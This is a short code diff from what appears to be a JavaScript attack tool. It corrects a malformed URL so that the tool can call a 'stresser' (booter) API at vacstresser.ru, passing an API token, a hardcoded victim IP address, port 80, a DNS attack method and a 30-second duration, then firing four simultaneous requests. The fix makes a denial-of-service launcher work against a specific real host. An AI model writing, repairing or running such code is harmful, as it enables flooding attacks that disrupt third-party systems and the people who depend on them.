@@ -54,7 +54,7 @@ async function clear() {
 }
 
 async function sendApiRequest(ip) {
-    const url = `hhttps://api.vacstresser.ru/api?key=${token}&host=191.13.20.96&port=80&method=DNS&time=30`;
+    const url = `https://api.vacstresser.ru/api?key=${token}&host=191.13.20.96&port=80&method=DNS&time=30`;
     const requests = Array(4).fill(url).map(u => axios.get(u));
     try {
         await axios.all(requests);
